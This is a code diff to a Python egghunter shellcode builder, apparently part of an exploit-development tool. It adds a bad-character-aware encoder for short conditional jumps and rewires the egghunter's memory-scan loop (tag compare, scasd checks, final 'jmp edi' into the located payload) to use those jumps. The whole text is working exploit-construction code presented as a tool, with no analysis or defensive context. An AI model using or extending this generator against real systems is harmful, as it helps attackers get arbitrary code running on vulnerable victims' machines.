@@ -151,6 +151,25 @@ def build_jump(offset: int, badchars: bytes) -> bytes:
     raise ValueError("Could not encode jump without badchars")
 
 
+def build_conditional_jump(opcode: int, offset: int, badchars: bytes) -> bytes:
+    """Build short conditional jump while honoring badchars.
+
+    Supports one-byte condition opcodes such as:
+    - 0x74: JE/JZ
+    - 0x75: JNE/JNZ
+    """
+
+    if opcode not in (0x74, 0x75):
+        raise ValueError(f"Unsupported conditional jump opcode: 0x{opcode:02x}")
+    badchars = _normalize_badchars(badchars)
+    if not (-128 <= offset <= 127):
+        raise ValueError("Conditional jump requires short-range offset")
+    candidate = bytes((opcode, _pack_i8(offset)))
+    if not (set(candidate) & set(badchars)):
+        return candidate
+    raise ValueError("Could not encode conditional jump without badchars")
+
+
 def build_controlled_jump(offset: int, badchars: bytes) -> bytes:
     badchars = _normalize_badchars(badchars)
     bad = set(badchars)
@@ -292,15 +311,19 @@ class EgghunterBuilder:
 
         # jump back length depends on syscall loader width
         jump_back = -17 if len(syscall_load) == 3 else -21
-        body.extend(self._build_jump(jump_back))
+        body.extend(self._build_conditional_jump(0x74, jump_back))  # je scan_next
 
         body.extend(b"\xB8")
         body.extend(tag)  # first 4-byte tag
         body.extend(b"\x8B\xFA")  # mov edi,edx
         body.extend(b"\xAF")  # scasd
-        body.extend(self._build_jump(-22 if len(syscall_load) == 3 else -26))
+        body.extend(
+            self._build_conditional_jump(0x75, -22 if len(syscall_load) == 3 else -26)
+        )  # jnz scan_next
         body.extend(b"\xAF")  # scasd
-        body.extend(self._build_jump(-25 if len(syscall_load) == 3 else -29))
+        body.extend(
+            self._build_conditional_jump(0x75, -25 if len(syscall_load) == 3 else -29)
+        )  # jnz scan_next
         body.extend(b"\xFF\xE7")  # jmp edi
 
         payload = bytes(body)
@@ -521,6 +544,11 @@ class EgghunterBuilder:
         self._emitted_jumps.append(encoded)
         return encoded
 
+    def _build_conditional_jump(self, opcode: int, offset: int) -> bytes:
+        encoded = build_conditional_jump(opcode, offset, self.config.badchars)
+        self._emitted_jumps.append(encoded)
+        return encoded
+
     def _mutate_instruction(self, name: str, original: bytes) -> bytes:
         if name in _PROTECTED_OP_NAMES:
             return original
@@ -574,7 +602,7 @@ class EgghunterBuilder:
                 raise ValueError("Emitted jump sequence missing from mutated payload")
             search_from = idx + len(encoded)
             op = encoded[0]
-            if op in (0xEB, 0x74):
+            if op in (0xEB, 0x74, 0x75):
                 rel = int.from_bytes(encoded[1:2], "little", signed=True)
                 target = idx + 2 + rel
                 if not (0 <= target < size):
@@ -611,5 +639,6 @@ __all__ = [
     "EgghunterConfig",
     "Strategy",
     "build_jump",
+    "build_conditional_jump",
     "build_controlled_jump",
 ]
